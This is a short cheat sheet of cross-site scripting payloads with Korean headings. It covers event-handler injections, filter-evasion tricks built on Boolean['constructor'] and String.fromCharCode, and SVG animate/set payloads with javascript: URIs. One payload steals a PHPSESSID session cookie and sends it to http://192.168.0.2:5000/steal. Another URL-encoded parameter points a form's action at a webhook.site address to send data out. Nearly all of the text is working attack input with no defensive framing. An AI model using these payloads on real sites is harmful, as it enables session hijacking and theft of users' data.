```html
# XSS 페이로드
"><svg/onwheel=alert'1'> 


aa"><onpointover="alert(1)"><input%20types="hidden"%20value=" 


<div class="~~~ -hidden"> 태그에서 hidden 삭제 후 활성화된 창에서 입력
Boolean['constructor']('alert(1);')();

Boolean['constructor']('a' + 'l' + 'e' + 'r' + 't' + '(1)')();

Boolean['constructor']('a'+'l'+'e'+'r'+'t'+'('+'d'+'o'+'c'+'u'+'m'+'e'+'n'+'t'+'.'+'c'+'o'+'o'+'k'+'i'+'e'+')')();


# navigator.sendBeacon 로 필터링 우회

# hex 인코딩
&lt;a onwheel="Boolean.constructor(String.fromCharCode(110,97,...))();"&gt;asdf&lt;/a&gt;


# CORS 정책 우회
;const img=new Image();img.src='http://192.168.0.2:5000/steal?PHPSESSID='+document.cookie.match(/PHPSESSID=([^;]+)/)[1];//'

";Boolean[%27constructor%27](%27al%27%2b%27er%27%2b%27t(1)%27)();"


;window.open("https://naver.com");


https://test.com/portal/bbs/example.do?bbsId=1&searchKey=bbsSjNm
  &searchVal=aaa%22+data-url%3D%2F%2Fwebhook.site%2Fc882d2b7-a486-4528-b5fc-test
  5116ab5+data-t%3Dsubmit+data-i%3D7+onpointerover%3D%22this.form.action%3Dthis.d
  ataset.url%3Bthis.form.elements%5Bthis.dataset.i%5D.type%3Dthis.dataset.t%3BfnS
  earchList%3Dnull


# on이벤트= 이 아닌 xss 삽입

<animate attributeName="href" values="javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>

<set attributeName="href" to="javascript:alert(1)" begin="x.click"/>

<animate attributeName="xlink:href" values="javascript:alert(1)" begin="0s" fill="freeze"/>
```
